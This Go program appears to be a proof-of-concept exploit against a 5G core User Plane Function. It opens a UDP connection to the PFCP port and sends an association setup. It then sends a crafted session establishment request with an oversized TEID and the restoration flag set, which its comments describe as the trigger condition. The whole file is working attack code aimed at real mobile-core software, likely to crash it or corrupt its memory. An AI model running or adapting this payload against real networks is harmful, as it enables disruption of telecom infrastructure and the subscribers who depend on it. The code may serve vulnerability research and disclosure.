package main
import (
	"flag"
	"fmt"
	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
	"log"
	"net"
)

func execPayload(host string) error {
	// random ip used as node id address
	var addr = "1.1.1.1"
	addrIp := net.ParseIP(addr)

	// create udp connection to upf
	conn, err := net.Dial("udp", host)
	if err != nil {
		return fmt.Errorf("net.Dial: %v", err)
	}
	defer conn.Close()

	// create NewAssociationSetupRequest
	asReq, _ := message.NewAssociationSetupRequest(
		0, ie.NewNodeID(addr, "", ""),
	).Marshal()

	// create NewSessionEstablishmentRequest
	seReq, _ := message.NewSessionEstablishmentRequest(0, 0, 0x0, 1, 0,
		ie.NewNodeID(addr, "", ""),
		ie.NewFSEID(0x0, addrIp, nil),
		ie.NewCreatePDR(
			ie.NewPDRID(0),
			ie.NewPDI(
				ie.NewSourceInterface(0),
				// (teid = 0 or teid = max_ue*4*16) and pfcpSEReq = 1
				ie.NewFTEID(1, 1024*4*16+1, addrIp, nil, 0),
			)),
		// pfcpSEReq = 1 -> Restoration Indication = Present
		ie.NewPFCPSEReqFlags(1),
	).Marshal()

	// send association setup
	conn.Write(asReq)
	fmt.Printf("sent NewAssociationSetupRequest 0x%x\n", asReq)

	// send session establishment with payload
	conn.Write(seReq)
	fmt.Printf("sent NewSessionEstablishmentRequest 0x%x\n", seReq)

	return nil
}

func main() {

	var (
		port = flag.Int("p", 8805, "upf pfcp port")
	)
	flag.Parse()
	if len(flag.Args()) != 1 {
		log.Fatal("set pfcp upf host")
	}
	host := fmt.Sprintf("%v:%d", flag.Arg(0), *port)

	err := execPayload(host)
	if err != nil {
		log.Fatalf("execPayload: %v", err)
	}
}
